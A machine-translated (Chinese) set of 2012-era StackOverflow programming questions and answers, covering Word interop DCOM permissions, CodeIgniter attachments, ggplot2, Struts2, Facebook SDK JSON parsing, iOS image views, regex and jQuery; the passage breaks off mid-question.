# StackOverflow 问答 12603000-12603999

# web-services - 由于以下错误，检索具有 CLSID {XXXX} 的组件的 COM 类工厂失败：80040005

> ID：12603000
> 
> 赞同：1
> 
> 时间：2012-09-26T13:35:03.997
> 
> 标签：web-services, office-2007, dcom

当我的 Web 服务尝试通过我的 .net Web 服务实用地打开 MS Word 文档时，我收到了下面提到的错误。当我通过 Visual Studio 运行 Web 服务时，它工作正常，但是当我在 IIS 7 上部署 Web 服务时，出现错误

```
Retrieving the COM class factory for component with CLSID 
{000209FF-0000-0000C000-000000000046} failed due to the following error: 80070005
Access is Denied 
```

在下一行。

```
Microsoft.Office.Interop.Word.Application oWordApp = new Microsoft.Office.Interop. Word.Application();
Microsoft.Office.Interop.Word.Document oWordDoc = new Microsoft.Office.Interop.Word.Document(); 
```

我已经在服务器端编写了这段代码。它必须打开word文档模板并查找和替换一些值并另存为不同的名称

**我使用 64 位系统**和 Office 2007。任何 1 都可以帮助我解决问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T17:20:13.483

我刚刚收到此错误，并通过调整服务器上 DCOM 配置中的权限来解决：

1.  单击开始 -> 运行 -> dcomcnfg
2.  展开组件服务 -> 计算机 -> 右键单击​​我的电脑 -> 属性
3.  在 COM 安全选项卡上单击启动和激活权限下的编辑默认值
4.  使用本地启动和本地激活添加网络服务和 IIS_IUSRS

为此不需要重新启动。如果您的应用程序池在其他用户下运行，请改为添加该用户。

# php - 在 Codeigniter 中发送带有附件的电子邮件

> ID：12603005
> 
> 赞同：1
> 
> 时间：2012-09-26T13:35:23.897
> 
> 标签：php, codeigniter, email, relative-path, filepath

我正在使用 Codeigniter 库发送带有附件的电子邮件，我要附加的文件位于以下目录中

```
/uploads/pdf/yourfile.pdf 
```

我将如何将其附加到其完整路径？例如，我怎样才能找到这个文件的正确路径（不是 URL）。

```
 $this->email->attach('/path/uploads/pdf/yourfile.pdf'); 
```

我怎样才能确定什么应该替换上面一行中的“路径”

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T13:44:59.623

您可以通过`__DIR__`魔术常量或`dirname(__FILE__)`在旧版本的 PHP 中获得脚本运行的目录，然后从这一点确定您的路径。然后，您可以使用`realpath()`已解析的文件路径。例如：

```
$path_to_the_file = realpath(__DIR__.'/../uploads/pdf/yourfile.pdf/'); 
```

首先尝试`echo __DIR__`找到您当前的位置，然后添加从您当前位置到的相对路径`__DIR__`并将其提供给`realpath()`

同样在 Codeigniter 中，常量 APPPATH 指向应用程序文件夹，所以这是另一种解决方案：

```
$path_to_the_file = realpath(APPPATH.'relative/path/to/the/file/from/application/folder'); 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-26T14:09:21.897

设法使用 CodeIgniters 功能来执行以下操作..

```
 $path = set_realpath('uploads/pdf/');
 $this->email->attach($path . 'yourfile.pdf'); 
```

希望这对其他人有帮助。再次感谢

注意：不要忘记之前加载路径助手，否则`set_realpath()`将不存在。

# r - 在ggplot2中围绕一系列点放置边界

> ID：12603006
> 
> 赞同：4
> 
> 时间：2012-09-26T13:35:25.803
> 
> 标签：r, ggplot2, boundary

我有一系列点，我想在周围放置一个边界。我该怎么办？

这些是我的观点： ![在此处输入图像描述](../Images/f1db30fa51e69d6817f5394a2f5e6248.png)

我试过 geom_line 但这显然是错误的，因为它产生了这个！

![在此处输入图像描述](../Images/d77fb41bbb329b99d3ae6a13d6a4ca3a.png)

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-18T11:17:12.980

使用`geom_path`而不是`geom_line`. 这是一个例子：

```
i <- seq(0, 2*pi, length.out=50)
dat <- data.frame(x=cos(i), y=sin(i))

library(ggplot2)
ggplot(dat, aes(x, y)) + geom_line() 
```

![在此处输入图像描述](../Images/59317b4271a51634c38c46cf3305cd95.png)

```
ggplot(dat, aes(x, y)) + geom_path() 
```

![在此处输入图像描述](../Images/0d38eb93ab99e9e58f679376fde311af.png)

# java - 如何使用 css 设置迭代器的特定运行样式

> ID：12603010
> 
> 赞同：0
> 
> 时间：2012-09-26T13:35:30.707
> 
> 标签：java, css, jsp, struts2

我在我的一个页面上有这个迭代器有没有一种方法可以设置迭代器的某个贯穿的样式，例如使第一次贯穿在 400 x 200 像素的容器中，下一次贯穿在大约 200 x 200 像素的不同容器中？

```
<s:iterator value="walkthroughs">
    <div>
        <span>
            <s:property default="fail" value="_walkthroughText"/>
        </span> 
     </div> 
</s:iterator> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-26T13:44:46.267

从[迭代器标签文档](http://struts.apache.org/2.3.4/docs/iterator.html)：

> status - 如果指定，则在每次迭代时将 instanceof IteratorStatus 推入堆栈

例如：

```
<s:iterator value="#it.days" status="rowstatus">
  <tr>
    <s:if test="#rowstatus.odd == true">
      <td style="background: grey"><s:property/></td>
    </s:if>
    <s:else>
      <td><s:property/></td>
    </s:else>
  </tr>
</s:iterator> 
```

[这是 IteratorStatus 的 Javadoc](http://struts.apache.org/2.3.4.1/struts2-core/apidocs/org/apache/struts2/views/jsp/IteratorStatus.html)。

# json - 使用 C# SDK 在 Windows Phone 7 中获取 Facebook 页面

> ID：12603014
> 
> 赞同：0
> 
> 时间：2012-09-26T13:35:53.513
> 
> 标签：json, windows-phone-7, facebook-c#-sdk

我尝试使用 Facebook C# SDK 页面中的 Windows Phone 示例来解决这个问题，但没有成功。

这是主要代码：

```
private void GetPages()
    {
        var fb = new FacebookClient(_accessToken);

        fb.GetCompleted += (o, e) =>
        {
            if (e.Error != null)
            {
                Dispatcher.BeginInvoke(() => MessageBox.Show(e.Error.Message));
                return;
            }

            var result = (IDictionary<string, object>)e.GetResultData();
            // returns data and paging from Facebook

            Dispatcher.BeginInvoke(() =>
            {
                foreach (var item in result)
                {
                    // Not sure if/how to use the custom classes here
                    //item has .Key and .Value
                    //.Key = data and .Value contains the key/value pais for each of the pages returned
                }

            });
        };

        fb.GetAsync("me/accounts");
    } 
```

// 自定义类

```
public class FacebookPageCollection
    {
        [JsonProperty(PropertyName = "data")]
        public FacebookPage[] data { get; set; }
        [JsonProperty(PropertyName = "paging")]
        public FacebookPagePaging paging { get; set; }
    }

    public class FacebookPage
    {
        [JsonProperty(PropertyName = "name")]
        public string Name { get; set; }

        [JsonProperty(PropertyName = "access_token")]
        public string AccessToken { get; set; }

        [JsonProperty(PropertyName = "category")]
        public string Category { get; set; }

        [JsonProperty(PropertyName = "id")]
        public string Id { get; set; }
    }

    public class FacebookPagePaging
    {
        [JsonProperty(PropertyName = "previous")]
        public Uri previous { get; set; }

        [JsonProperty(PropertyName = "next")]
        public Uri next { get; set; }
    } 
```

这是变量“result”返回的内容： {"data":[{"name":"value1","access_token":"value2","category":"value3","id":"value4"," perms":["ADMINISTER","EDIT_PROFILE","CREATE_CONTENT","MODERATE_CONTENT","CREATE_ADS","BASIC_ADMIN"]},{"name":"value1","access_token":"value2","category" :"value3","id":"value4","perms":["ADMINISTER","EDIT_PROFILE","CREATE_CONTENT","MODERATE_CONTENT","CREATE_ADS","BASIC_ADMIN"]}],"paging":{ “下一个”：“网址”}}

我想做的是检索并保存每个页面的详细信息。

我一直试图弄清楚这一点，并查看了这里和其他地方的许多其他帖子。我只是没有足够的经验来弄清楚。

任何帮助表示赞赏。

谢谢你。斯里兰卡

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-07T21:06:06.743

这是了解如何在 fb c# sdk 中使用 json 响应的技巧。

这是 Javascript JSON 和 C# JSON 之间的映射。（请注意，没有 DateTime 和另一个复杂的 .net 对象，因为它不是 JSON.org 中的 JSON 规范的一部分）

```
JsonObject => keyvalue pairs => IDictionary<string, object> / IDictinary<string, dynamic>
JsonArray => array => IList<object> / IList<dynamic>
string => string
number => long/decimal
boolean => bool 
```

这是您进行实际映射的方法。

```
var result = (IDictionary<string, object>)e.GetResultData();
var data = (IList<object>)result["data"];
foreach(var act in data) {
    var account = (IDictionary<string,object>) act;
    var name = (string)account["name"];
    var accessToken = (string)account["access_token"];
    var id = (string)account["id"];

    // normalize to IList<string> permissions, so it is easier to work without casting.
    var permissions = ((IList<object>)account["perms"]).Select(x => (string)x).ToList();
} 
```

# iphone - You Tube 是否允许应用程序开发者使用他们的服务来托管和播放来自许多用户的视频？

> ID：12603017
> 
> 赞同：1
> 
> 时间：2012-09-26T13:35:59.173
> 
> 标签：iphone, youtube-api

我正在构建一个 iPhone 应用程序，它可以让 iPhone 用户上传视频并分享它们。当我们将视频上传到我们的服务器时，播放是断断续续的。我们可以将这些上传的视频路由到 You Tube，然后通过 You Tube 播放（iPhone 用户无需创建个人帐户）吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T16:51:25.320

您可以将视频上传到 YouTube 并在 iOS 设备上播放，但强烈建议您要求用户将视频上传到他们自己的 YouTube 帐户中，而不是将它们存储在某个主帐户中。其原因在[http://apiblog.youtube.com/2012/02/video-uploads-from-your-sites-community.html进行了解释](http://apiblog.youtube.com/2012/02/video-uploads-from-your-sites-community.html)

# ios - 如何使 UIImageView 自动调整为加载图像的大小

> ID：12603025
> 
> 赞同：20
> 
> 时间：2012-09-26T13:36:30.977
> 
> 标签：ios, uiimageview, resize, point, touches

我已经用 IB 在我的视图上放置了一个 UIImageView 控件。控件的大小只是我决定的，非常随机的大小我想要做的是控件在我将*图像*属性设置为新图像时自动调整大小。我希望它实际调整为图像的大小。可以自动完成吗？没有任何代码干预？如果不是 - 在这种情况下最好的方法是什么？

今天发生的事情很奇怪。我将图像加载到 ImageView 中，即使 ImageView 的大小没有改变，我也看到图像正确显示。这干扰了我在 ImageView 上抓取用户触摸的意图。用户触摸实际图像，但由于图像的某些部分在 ImageView 的外部（这是奇怪的部分）-点映射变得疯狂有人能想到任何解释吗？

谢谢

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-09-29T07:13:47.980

图像的大小与 UIImageView 的实际大小无关，而 UIImageView 的大小仅取决于 Interface Builder 中赋予它的大小（或您分配给它的大小）。否则，例如，当您将 @2x 图像用于 Retina 显示器时，图像会很奇怪。

如果要解决此问题，还必须在设置图像时更改框架。如果你现在这样做：

```
[imageView setImage:[UIImage imageNamed:@"myImage.jpg"]]; 
```

将其更改为：

```
UIImage img = [UIImage imageNamed:@"myImage.jpg"];
[imageView setImage:img];
imageView.frame = CGRectMake(imageView.frame.origin.x, imageView.frame.origin.y,
                             img.size.width, img.size.height); 
```

然而，这不会改变它包含的视图的布局，你可以让它在 iOS 6 下使用布局约束自动改变其他视图的大小。如果您是 Apple 开发人员，您可以观看 WWDC 说明视频，他们解释了该系统如何运作良好。

如果您对视图没有增长感到满意，而问题只是当您将其更改为与包含视图的尺寸不匹配的图像时图像如何溢出它的边界，您可以在界面中设置“剪辑子视图”复选框图像视图的生成器。这将使视图不会在它自己的边界框之外绘制任何东西，如果您还将缩放模式设置为“Aspect Fill”或“Scale To Fill”，图像将始终填满包含视图的整个边界.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-02-03T20:28:12.513

这是我经常剪切和粘贴的代码片段，使用与上面的 Hampus Nilsson 相同的方法 -

**例子**

```
func demo(x0:CGFloat, y0:CGFloat) {
    let imgView = UIImageView(image: UIImage(named: "someImg.png"));
    imgView.sizeToImage();
    imgView.center = CGPoint(x:x0, y:y0);
} 
```

**UIImageView 扩展**

```
extension UIImageView {

/******************************************************************************/
/** @fcn        sizeToImage()
 *  @brief      size view to image
 *  @@assum     (image!=nil)
 */
/******************************************************************************/
func sizeToImage() {

    //Grab loc
    let xC = self.center.x;
    let yC = self.center.y;

    //Size to fit
    self.frame  = CGRect (x: 0, y: 0, width: (self.image?.size.width)!/2, height: (self.image?.size.height)!/2);

    //Move to loc
    self.center = CGPoint(x:xC, y:yC);

    return;
} 
```

一个美妙的剪切和粘贴，如果需要使用！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-12-29T17:54:42.537

让 containerView = UIView(frame: CGRect(x:0,y:0,width:320,height:500)) 让 imageView = UIImageView()

```
if let image = UIImage(named: "Image_Name_Here") {
    let ratio = image.size.width / image.size.height
    if containerView.frame.width > containerView.frame.height {
        let newHeight = containerView.frame.width / ratio
        imageView.frame.size = CGSize(width: containerView.frame.width, height: newHeight)
    }
    else{
        let newWidth = containerView.frame.height * ratio
        imageView.frame.size = CGSize(width: newWidth, height: containerView.frame.height)
    }
} 
```

# r - 将R中给定半径内的点组合到质心

> ID：12603027
> 
> 赞同：1
> 
> 时间：2012-09-26T13:36:34.200
> 
> 标签：r, cluster-analysis, centroid

我觉得这不能太难。我知道`hclust()`，`cutree()`但是如何获得质心的坐标，其中没有点距离高于给定半径？我知道质心范围内的点可能已经属于不在范围内的质心。我对此很好。

```
set.seed(1)
data <- matrix(runif(100),ncol=2)
plot(data) 
dclust <- hclust(dist(data),method="centroid")
cutree(dclust,h=0.1) 
```

`cutree(...,h=0.1)``dclust`由于未订购高度，将已经失败。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T01:49:26.390

使用您的数据并运行 25 个组的 kmeans 会产生以下结果。这是你的意思吗？

```
Example <- kmeans(data, 25)
plot(data, type="n")
text(Example$centers, unlist(dimnames(Example$centers)), col="red")
text(data, as.character(Example$cluster), cex=.75)
cdist <- sqrt((data[,1] - Example$centers[Example$cluster, 1])^2 + 
     (data[, 2] - Example$centers[Example$cluster, 2])^2)
names(cdist) <- 1:50
cdist 
```

最后三行计算并显示每个点到它所分配的质心的距离。

# perl - 从 HTML 中收集链接并构建 perl 哈希

> ID：12603029
> 
> 赞同：0
> 
> 时间：2012-09-26T13:36:36.570
> 
> 标签：perl

我正在尝试从本地存储的 HTML 文件中获取所有链接并构建一个哈希，我正在使用 File::Find 来获取 html 文件，但已将其排除在代码之外。

1.  第一个哈希键将是标题
2.  第二个键镜像
3.  第三个键的部分，然后是 url

像

```
$hash{$title}{$mirror}{$part}=$url; 
```

我可以获得具有单个零件和单个镜子的链接，但我没有得到多个零件，目前我被困在一个循环中。我通过匹配 url 的模式来获取镜像，但是如果它存在，我如何获取该部分，否则 $part = "part_1" 我需要移动到下一个 url

```
#!/usr/bin/perl

my $Html = qq(
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
    <html>
      <head>
      <meta http-equiv="content-type" content="text/html; charset=windows-1250">
      <meta name="generator" content="PSPad editor, www.pspad.com">
      <title>First hash key</title>
      </head>
      <body>
      <div>
       <br><b>Multi Links</b><br><br><!--colorstart:#FF0000-->

       <span style="color:#FF0000"><!--/colorstart--><b>Mirror 1</b><!--colorend--></span><!--/colorend-->
       <br><a href="http://mirror1.com/rvvaq1hi" target="_blank"><b>Part 1</b></a>
       <br><a href="http://mirror1.com/w33h9ym2" target="_blank"><b>Part 2</b></a>
       <br><a href="http://mirror1.com/fdnppn15" target="_blank"><b>Part 3</b></a></div>

        </div>
      <div>
      <br><b>Single link multiple mirrors</b><br>
      <br><a href="http://mirror1.com/t2wx9603" target="_blank"><!--colorstart:#FF0000--><span style="color:#FF0000"><!--/colorstart--><b>Mirror 1</b><!--colorend--></span><!--/colorend--></a></div>
        <br><a href="http://mirror2.com/t2wx9603" target="_blank"><!--colorstart:#FF0000--><span style="color:#FF0000"><!--/colorstart--><b>Mirror 2</b><!--colorend--></span><!--/colorend--></a></div>    

        </div>

      </body>
    </html>
);
my @html = split(\n,$Html);
    my $TheMain;
    my $Title;
    my @Names=(Mirror1,Mirror2,Mirror3);
    my %hash;

      foreach my $line (@html)
        {
        print "Da Line [$line]\n";
        if ($line =~ m{<title>(.*?)</title>} )
          {
           $Title = $1;
           print "$Title\n";
          }
         $line =~ s/\"/'/g;   # Double quotes to single
         $line=~ s{\n}{}g;  #remove \n
         $line=~ s{\s+}{ }g;#remove excessive spaces

          $TheMain = $TheMain . $line;
        }
        print "$TheMain\n";
     unless ($TheMain eq "") # unless empty enter the loop
       {
        while ($TheMain =~ m{a href=(.*?)/a}) 
        {
            my $A = $1;
            print "the A  $A\n";  ## stuck in a loop
            my ($url,$part);
            $A =~ s/<.*?color.*?>//ig;
            while ($A =~ m{\'(http.*?)\'.*?<b>(.*?)</b> }gi)
              {
               $url = $1;
               $part = $2;
               if ($part =~m/part/i)
                {
                  $part =~ s/ /_/;
                }
               else
                {
                  $part = "part_1";
                } 
              }

           foreach my $mirror (@NAMES)   # fillters out unwanted links
            {
              if ($url =~/$mirror/i)
                {
                  $hash{$Title}{$mirror}{$part}=$url;
                }
            }
          }
        }

for my $Title (sort keys %hash) 
  {
    for my $Host  (sort keys %{$hash{$Title}})
      {

          for my $part (sort keys %{$hash{$Title}{$Host}})
            {

               my $url = $hash{$Title}{$Host}{$part};
               print "$Title,$url\n";
             } 
      }
     } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T14:07:16.580

请参阅对“如何使用正则表达式解析 HTML？”的一般问题的综合回答。

[RegEx 匹配打开的标签，XHTML 自包含标签除外](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags)

# jquery - 选择 Jquery，在 vbscript/classic asp 和 ASPupload 中检索多个选择值

> ID：12603030
> 
> 赞同：1
> 
> 时间：2012-09-26T13:36:38.307
> 
> 标签：jquery, asp-classic, vbscript

今天早上我发布了一个关于 Chosen jQuery 脚本的问题，我是如何使用经典 asp 从选定的 jquery 多选框中检索值的，有人问我要演示代码，所以在构建它时，一切似乎都能正常工作突然好起来了，以为你知道我老了，但是在尝试实现代码后我遇到了同样的问题，但我想我可能已经找到了我正在运行的问题。您将在下面找到所涉及的代码：

这包括选择的 jquery (http://harvesthq.github.com/chosen/) 的 2 种形式，最上面的一种是普通形式，第二种是具有上传功能的形式，我在两个页面下面都包含了代码：

## “example.jquery.html”的代码

```
<!doctype html> 
<html lang="en"> 
<head>
  <link rel="stylesheet" href="chosen/chosen.css" />
</head>
<body>
<h3>Chosen without enctype="multipart/form-data"</h3>
<form action="CollectChosenData.asp?type=plain" method="post" name="ExampleChosen">
<div id="container">
    Multiple Select<br><br>
    <select data-placeholder="Your Favorite Types of Bear" style="width:350px;" multiple class="chzn-select" name="ChosenData" tabindex="8">
        <option value=""></option>
        <option value="1">American Black Bear</option>
        <option value="2">Asiatic Black Bear</option>
        <option value="3">Brown Bear</option>
        <option value="4">Giant Panda</option>
        <option value="5" selected>Sloth Bear</option>
        <option value="6">Sun Bear</option>
        <option value="7" selected>Polar Bear</option>
        <option value="8">Spectacled Bear</option>
    </select>
    <br>
    <br>

    text field:
    <input type="text" name="othertext" value="text value">
    <br>
    <br>
    <input type="submit" name="ExampleChosenSubmit" value="Post form">
  </div>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js" type="text/javascript"></script>
  <script src="chosen/chosen.jquery.js" type="text/javascript"></script>
  <script type="text/javascript"> $(".chzn-select").chosen();</script>
  </form>
<br>
<hr>
<br>

<h3>Chosen with enctype="multipart/form-data"</h3>
<form action="CollectChosenData.asp?type=upload" method="post" name="ExampleChosenUpload" enctype="multipart/form-data">
<div id="container">
    Multiple Select<br><br>
    <select data-placeholder="Your Favorite Types of Bear" style="width:350px;" multiple class="chzn-select" name="ChosenData" tabindex="8">
        <option value=""></option>
        <option value="1">American Black Bear</option>
        <option value="2">Asiatic Black Bear</option>
        <option value="3">Brown Bear</option>
        <option value="4">Giant Panda</option>
        <option value="5" selected>Sloth Bear</option>
        <option value="6">Sun Bear</option>
        <option value="7" selected>Polar Bear</option>
        <option value="8">Spectacled Bear</option>
    </select>

    <br>
    <br>

    other field:
    <input type="file" name="mytestfile" value="">
    <br>
    <br>

    text field:
    <input type="text" name="othertext" value="text value">
    <br>
    <br>
    <input type="submit" name="ExampleChosenSubmit" value="Post form">
  </div>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js" type="text/javascript"></script>
  <script src="chosen/chosen.jquery.js" type="text/javascript"></script>
  <script type="text/javascript"> $(".chzn-select").chosen();</script>
  </form>
</body>
</html> 
```

==================================================== ==================================================== ==================================================== ===============

## 'CollectChosenData.asp' 的代码

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>
<head>
    <title>Untitled</title>
</head>

<body>
<% 
If Request.Querystring("type") = "plain" Then
    Response.write "Value collected from chosen select box: '"& Request.Form("ChosenData") &"'<br/>"
    Response.write "Value collected from text field: '"& Request.Form("othertext") &"'<br/>"
ELseIf Request.Querystring("type") = "upload" Then
    Set objUpload = Server.CreateObject("Persits.Upload")
        objUpload.OverwriteFiles = False
        objUpload.SetMaxSize 1048576    ' Limit files to 1MB
        objUpload.SaveVirtual "/upload"
        Response.write "Value collected from chosen select box: '"& objUpload.Form("ChosenData") &"'<br/>"
        For Each File in objUpload.Files
            Response.write File.FileName &"<br/>"
        Next
        Response.write "Value collected from text field: '"& objUpload.Form("othertext") &"'<br/>"
    Set objUpload = nothing
End if

 %>
<br>
<br>
Return and <a href="example.jquery.html">try again</a>
</body>
</html> 
```

现在为什么第一种形式（普通版）会给我正确的值返回'ChosenData'而第二种形式没有？

非常感谢你们的帮助和回复，他一边挠头一边说......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T06:14:04.867

您的问题似乎是上传组件仅显示选择多个值之一。

请参阅[“Upload.Form 仅返回多选控件的第一个选定项”](http://support.persits.com/show.asp?code=PS01032617)。

如解决方法所示，您将必须遍历每个名​​为`ChosenData`和显示的表单元素。

# javascript - 事件不触发

> ID：12603044
> 
> 赞同：0
> 
> 时间：2012-09-26T13:37:29.793
> 
> 标签：javascript, jquery, html, tiddlywiki

我有这些代码应该会错误地处理两个函数并为它们触发事件。然而，由于某种原因，该事件似乎没有触发。他们按预期登录到控制台，但该事件永远不会被触发。

```
//Show backstage event
(function( $, oldRem ){
    backstage.show = function(){
        console.log("yup, I'm the right one");
        var resp = oldRem.apply( this, arguments );
        $("#backstageArea").trigger("showBackstage");
        return(resp);
    };
})( jQuery, backstage.show );
//Hide backstage event
(function( $, oldRem ){
    backstage.hide = function(){
        console.log("And so am I.");
        var resp = oldRem.apply( this, arguments );
        if(anim && config.chkAnimate) {setTimeout( 'jQuery("#backstageArea").trigger("hideBackstage")', config.animDuration);}
        else {$("#backstageArea").trigger("hideBackstage");}
        return(resp);
    };
})( jQuery, backstage.hide );

//Resize never logs its console message.
jQuery.bind("hideBackstage", function(){topbar.resize();});
jQuery.bind("showBackstage", function(){topbar.resize();}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-26T13:53:24.457

您需要指定要使用的元素`bind`，因此请尝试：

```
jQuery("#backstageArea").bind(... 
```

代替

```
jQuery.bind(... 
```

（如果您使用的是 jQuery 1.7+ 版本，您可能希望切换到该[`.on()`方法](http://api.jquery.com/on/)- 为此目的会产生相同的效果，但这是从 v1.7 开始推荐的做事方式。）

# c# - 在c#中通过正则表达式提取字符串

> ID：12603046
> 
> 赞同：-1
> 
> 时间：2012-09-26T13:37:33.810
> 
> 标签：c#, regex, string

我有一些带有如下代码的 html 文件：

```
 <div style="border: 0px red solid; width: 633px; position: relative; margin: 0px;
                                                                float: right">
                                                                <font style="font-size: 8pt; color: Navy; font-weight: Bold;">Unit Name: </font>My Unit Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font style="font-size: 8pt; color: Navy; font-weight: Bold;">
                                                                    Manager: </font>My Manager Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font style="font-size: 8pt;
                                                                        color: Navy; font-weight: Bold;">Category: </font>My Category
                                                            </div>
                                                            <div style="border: 0px red solid; width: 122px; position: relative; margin: 0px;
                                                                padding: 0px;">
                                                                <button name="sSdewfwo87kjLKH7624QAZMLLPIdyt75576rtffTfdef22de" style="font-family: Tahoma;"
                                                                    onclick="OpenMyWin2(1,843442,8445,'bf61fd588f00cbe7a37dab20c62e1c63')">
                                                                    More Info</button></div> 
```

我想在 Category: & Manager: & Unit Name: 前面提取信息。如何使用正则表达式从大型 html 文件中提取这些内容。这些文件可能有 100 个类似的项目。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-26T13:39:23.183

I would recommend you consider using that tool: [http://htmlagilitypack.codeplex.com/](http://htmlagilitypack.codeplex.com/)

It allows easily parse any HTML you want.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-26T13:44:42.647

**使用正则表达式来解析 HTML**代码是个坏主意，但是如果您仍然想使用正则表达式，请使用模式：

```
>\s*Unit Name:[^>]*>([^<]+).*?>\s*Manager:[^>]*>([^<]+).*?>\s*Category:[^>]*>([^<]+) 
```

可以简化为

```
>\s*(?:Unit Name|Manager|Category):[^>]*>([^<]+) 
```

* * *

要修剪`&nbsp;`尾部`([^<]+)`，请在正则表达式模式中替换为`(\w+)`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-26T13:49:51.983

也许这可以帮助你。这使用**[Lookahead 和 Lookbehind 零宽度断言。](http://www.regular-expressions.info/lookaround.html)**

```
 (?<=(Category:|Manager:|Unit Name:) (</font>)?).*?(?=(&|<)) 
```

正则表达式好友截图

![在此处输入图像描述](../Images/0b7f2f70582a27a8a783ffd00bab0b23.png)

# iphone - 如何将 JSON 序列化数据转换为 NSDictionary

> ID：12603047
> 
> 赞同：60
> 
> 时间：2012-09-26T13:37:39.300
> 
> 标签：iphone, objective-c, ios, json

这个方法我用过

```
NSDictionary *jsonObject=[NSJSONSerialization 
       JSONObjectWithData:jsonData 
                  options:NSJSONReadingMutableLeaves 
                    error:nil];
NSLog(@"jsonObject is %@",jsonObject); 
```

它正在打印“jsonObject 为空”。
“错误：无”有什么问题吗？
我没有使用任何 url 或连接方法。
我有一个 json 文件，我想在表格中显示它。

* * *

## 回答 #1

> 赞同：155
> 
> 时间：2012-09-26T14:26:25.437

请尝试以下代码。

```
NSError* error;
NSDictionary* json = [NSJSONSerialization JSONObjectWithData:responseData
                                                     options:kNilOptions 
                                                       error:&error];

NSArray* latestLoans = [json objectForKey:@"loans"];

NSLog(@"loans: %@", latestLoans); 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2015-10-27T06:28:46.923

以防万一有人在这里查看快速代码：

> **NSData 到 NSDictionary**

```
let dictionary:NSDictionary = NSKeyedUnarchiver.unarchiveObjectWithData(jsonData)! as NSDictionary 
```

> **NSData 到 NSString**

```
let resstr = NSString(data: res, encoding: NSUTF8StringEncoding) 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2012-09-26T14:09:37.587

检查您的 json 输入，是否您的根元素既不是字典也不是数组？文档说在这种情况下您必须指定 NSJSONReadingAllowFragments 作为选项。

```
#import <Foundation/Foundation.h>

int main(int argc, char *argv[]) {
    NSAutoreleasePool *p = [[NSAutoreleasePool alloc] init];

    NSData *jsonData = [@"{ \"key1\": \"value1\" }" dataUsingEncoding:NSUTF8StringEncoding];
    NSDictionary *jsonObject=[NSJSONSerialization 
           JSONObjectWithData:jsonData 
                      options:NSJSONReadingMutableLeaves 
                        error:nil];
    NSLog(@"jsonObject is %@",jsonObject);

    [p release];
} 
```

输出：

```
2012-09-26 16:06:51.610 Untitled[19164:707] jsonObject is {
    key1 = value1;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-03-25T21:22:50.647

```
NSError* error;
NSDictionary* json = [NSJSONSerialization JSONObjectWithData:responseData options:kNilOptions error:&error]; 
```

这只是顶帖的更简洁版本。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2018-04-05T08:58:12.037

> 让convertedJsonIntoDict = 试试JSONSerialization.jsonObject(with: data!, options: []) as? NS词典

# visual-studio-2010 - 在 Windows phone 7 DEVICE 上调试

> ID：12603050
> 
> 赞同：1
> 
> 时间：2012-09-26T13:37:52.430
> 
> 标签：visual-studio-2010, windows-phone-7, windows-phone-7.1

我是 Windows Phone 7 开发的新手。我想在连接的设备中运行/调试我的 WP7 应用程序，当我在 VS 2010 中将目标更改为 Windows Phone 设备（从 Windows Phone 模拟器）时，它无法运行并显示错误消息。我是否缺少任何步骤/程序。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-26T13:41:59.470

在将应用程序部署到 Windows Phone 之前，您必须先注册手机，这需要 Dev Center 上的有效开发人员帐户。每个开发者帐户都可以注册三个设备以进行应用程序开发。创建开发者帐号并注册手机后，您可以在手机上安装、运行和调试未签名的应用程序。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-26T13:44:49.553

您可以得到 3 种类型的错误：

1.  您的设备未注册为开发者的设备。
2.  Zune 软件不启动。
3.  您的手机位于锁定屏幕下方。

# javascript - .on() 函数不适用于 Bootstrap 模式中的 Ajax 加载表单

> ID：12603053
> 
> 赞同：1
> 
> 时间：2012-09-26T13:37:57.593
> 
> 标签：javascript, jquery, django, twitter-bootstrap

因此，我通过在**index.html**中执行以下操作来加载表单。

```
 $(".add-cell").click(function(ev) { // for each edit contact url
        ev.preventDefault(); // prevent navigation
        var url = $(this).data("form"); // get the contact form url
        $("#cell-modal").load(url, function() { // load the url into the modal
            $(this).modal('show'); // display the modal on url load
        });
        return false; // prevent the click propagation
    }); 
```

这将加载位于文件**add.html**中的表单。这是表格：

```
 <div class="modal-header">
   <button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
    <h3>{{l_name}}, <small>new cell</small></h3>
 </div>
 <div class="modal-body">
    <form class="cell-form" action="/cells/add/{{l_name}}/{{l_id}}/" method="post">   
     {% csrf_token %}
     {{ cell_form.as_table }}
     </form>
 </div>
 <div class="modal-footer">
     <input class="btn btn-success submit" type="submit" id="cell_submit" value="Submit" />
     <input type="button" name="cancel" class="btn btn-danger" data-dismiss="modal" value="Close"/>
 </div> 
```

现在，在我的**index.html**中，我有以下代码：

```
